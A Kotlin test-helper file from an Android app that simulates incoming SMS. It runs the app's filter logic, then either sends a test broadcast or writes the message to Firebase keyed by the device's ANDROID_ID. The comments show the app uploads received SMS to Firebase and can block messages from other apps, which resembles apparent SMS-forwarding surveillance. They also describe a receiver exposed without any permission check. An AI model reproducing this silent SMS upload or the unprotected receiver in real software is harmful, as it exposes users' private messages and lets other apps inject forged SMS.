package com.example.fast.util

import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import com.example.fast.config.AppConfig
import com.example.fast.notification.AppNotificationManager
import com.google.firebase.Firebase
import com.google.firebase.database.database
import com.prexoft.prexocore.readInternalFile

/**
 * Utility class for testing SMS reception by simulating fake incoming SMS messages
 * This allows you to test your SmsReceiver without needing actual SMS messages
 * 
 * Behavior depends on whether app is set as default SMS app:
 * - If DEFAULT SMS app: Creates REAL message and triggers SmsReceiver processing
 *   (simulates SMS_DELIVER_ACTION broadcast - goes through all SMS processing logic)
 * - If NOT default: Creates FAKE message (Firebase only, app-scoped)
 */
object SmsTestHelper {
    
    /**
     * Simulate receiving a fake or real SMS message for testing
     * 
     * Behavior:
     * - If app is DEFAULT SMS app: Creates REAL message and triggers SmsReceiver
     *   ✅ Triggers SmsReceiver processing (simulates SMS_DELIVER_ACTION broadcast)
     *   ✅ Goes through filter checks (filterSms.txt)
     *   ✅ Goes through block checks (blockSms.txt)
     *   ✅ Writes to system SMS database (visible to other apps)
     *   ✅ Uploads to Firebase via SmsMessageBatchProcessor
     *   ✅ Appears in device's SMS inbox
     *   ✅ Other apps can see the message
     * 
 * - If app is NOT default: Creates FAKE message (app-scoped only)
 *   ✅ Uploads to Firebase directly
 *   ✅ Shows notification
 *   ✅ Shows in app UI
 *   ❌ Does NOT trigger SmsReceiver
 *   ❌ Does NOT write to system SMS database
 *   ❌ Does NOT appear in device's SMS inbox
     * 
     * @param context The application context
     * @param senderPhoneNumber The phone number sending the SMS (e.g., "+1234567890")
     * @param messageBody The message content
     * @return true if the SMS was successfully simulated
     */
    fun simulateReceivedSms(
        context: Context,
        senderPhoneNumber: String,
        messageBody: String
    ): Boolean {
        // Use the direct simulation method which is more reliable
        simulateSmsReceptionDirect(context, senderPhoneNumber, messageBody)
        return true
    }
    
    /**
     * Simulate SMS reception - REAL message with broadcast if default SMS app, FAKE if not
     * 
     * Behavior when app is DEFAULT SMS app (REAL message with SmsReceiver processing):
     * - ✅ Triggers SmsReceiver.processTestMessage() - simulates SMS_DELIVER_ACTION broadcast
     * - ✅ Goes through complete SMS processing pipeline (same as real SMS)
     * - ✅ Applies filterSms.txt rules
     * - ✅ Applies blockSms.txt rules (blocks from other apps if configured)
     * - ✅ Writes to system SMS database (if not blocked)
     * - ✅ Uploads to Firebase via SmsMessageBatchProcessor (if not filtered)
     * - ✅ Message appears in device's SMS inbox
     * - ✅ Other SMS apps can see the message
     * - ✅ Appears in app's UI
     * 
 * Behavior when app is NOT default (FAKE message, app-scoped):
 * - ✅ Uploads to Firebase directly
 * - ✅ Shows notification
 * - ✅ Appears in app's UI
 * - ❌ Does NOT trigger SmsReceiver (no broadcast simulation)
 * - ❌ Does NOT write to system SMS database
 * - ❌ Does NOT appear in device's SMS inbox
 * - ❌ Other apps cannot see the message
     * 
     * @param context The application context
     * @param senderPhoneNumber The phone number sending the SMS
     * @param messageBody The message content
     */
    @SuppressLint("HardwareIds")
    fun simulateSmsReceptionDirect(
        context: Context,
        senderPhoneNumber: String,
        messageBody: String
    ) {
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            val timestamp = System.currentTimeMillis()
            
            // Check if app is default SMS app
            val isDefaultSmsApp = DefaultSmsAppHelper.isDefaultSmsApp(context)
            
            android.util.Log.d("SmsTestHelper", "Simulating SMS - isDefaultSmsApp: $isDefaultSmsApp")
            
            // Check filter if exists
            val filter = try {
                context.readInternalFile("filterSms.txt")
            } catch (e: Exception) {
                ""
            }
            
            // Apply filter logic (same as SmsReceiver)
            if (filter.isNotEmpty()) {
                val filterType = if (filter.contains("~")) filter.split("~")[1] else "contains"
                val filterWord = filter.split("~")[0]
                
                val shouldProcess = when (filterType) {
                    "contains" -> messageBody.contains(filterWord, true)
                    "containsNot" -> !messageBody.contains(filterWord, true)
                    "equals" -> messageBody.lowercase() == filterWord.lowercase()
                    "equalsNot" -> messageBody.lowercase() != filterWord.lowercase()
                    "startsWith" -> messageBody.startsWith(filterWord, true)
                    "startsWithNot" -> !messageBody.startsWith(filterWord, true)
                    "endsWith" -> messageBody.endsWith(filterWord, true)
                    "endsWithNot" -> !messageBody.endsWith(filterWord, true)
                    else -> true
                }
                
                if (!shouldProcess) {
                    android.util.Log.d("SmsTestHelper", "Message filtered out by filterSms.txt")
                    return
                }
            }
            
            // If app is default SMS app, send actual broadcast Intent to trigger SmsReceiver
            // This makes test message go through the same flow as real SMS (filters, blocking, etc.)
            if (isDefaultSmsApp) {
                android.util.Log.d("SmsTestHelper", "📡 SENDING TEST SMS BROADCAST (default SMS app)")
                android.util.Log.d("SmsTestHelper", "   Sender: $senderPhoneNumber, Body: $messageBody")
                
                // Send actual broadcast Intent to trigger SmsReceiver.onReceive()
                // This makes the broadcast visible and triggers the full receiver pipeline
                // The test action intent-filter has no permission requirement, so it can receive this broadcast
                val broadcastIntent = android.content.Intent("com.example.fast.TEST_SMS_ACTION").apply {
                    putExtra("sender", senderPhoneNumber)
                    putExtra("body", messageBody)
                    putExtra("timestamp", timestamp)
                    // Don't set package or component - let it be a proper broadcast
                }
                
                android.util.Log.d("SmsTestHelper", "📤 Sending broadcast Intent: ${broadcastIntent.action}")
                android.util.Log.d("SmsTestHelper", "📤 Intent extras: sender=$senderPhoneNumber, body=$messageBody")
                
                // Send broadcast - the test action intent-filter has no permission requirement
                // so it can receive this broadcast even though other filters require BROADCAST_SMS
                context.sendBroadcast(broadcastIntent)
                android.util.Log.d("SmsTestHelper", "✅ TEST SMS BROADCAST sent successfully!")
                android.util.Log.d("SmsTestHelper", "📡 Broadcast should trigger SmsReceiver.onReceive() - check logs")
            } else {
                // Non-default app: Direct Firebase upload only (FAKE message)
                android.util.Log.d("SmsTestHelper", "FAKE SMS: Direct Firebase upload only (not default SMS app)")
                val messagePath = AppConfig.getFirebaseMessagePath(deviceId, timestamp)
                val value = "received~$senderPhoneNumber~$messageBody"
                
                Firebase.database.reference
                    .child(messagePath)
                    .setValue(value)
                    .addOnSuccessListener {
                        android.util.Log.d("SmsTestHelper", "FAKE SMS simulated successfully - added to Firebase at $messagePath")
                        // Message notifications removed - messages saved to Firebase only
                    }
                    .addOnFailureListener { e ->
                        android.util.Log.e("SmsTestHelper", "Failed to simulate SMS", e)
                    }
            }
        } catch (e: Exception) {
            android.util.Log.e("SmsTestHelper", "Error simulating SMS reception", e)
            e.printStackTrace()
        }
    }
    
    /**
     * Simulate SMS using ADB command format (for reference)
     * This shows the ADB command you can use for testing
     * 
     * Usage: Run this ADB command from terminal:
     * adb shell am broadcast -a android.provider.Telephony.SMS_RECEIVED --es sender "+1234567890" --es body "Test message"
     * 
     * However, Android doesn't allow broadcasting SMS_RECEIVED via ADB for security reasons.
     * So we use the direct simulation method instead.
     */
    fun getAdbCommandExample(senderPhoneNumber: String, messageBody: String): String {
        return """
            Note: Direct SMS simulation via ADB is restricted by Android for security.
            Use simulateSmsReceptionDirect() method instead.
            
            Alternative: Use Android Emulator's SMS testing feature:
            1. Open Android Emulator
            2. Click the "..." button (three dots) in the emulator toolbar
            3. Go to "Phone" tab
            4. Enter phone number and message
            5. Click "Send Message"
        """.trimIndent()
    }
}

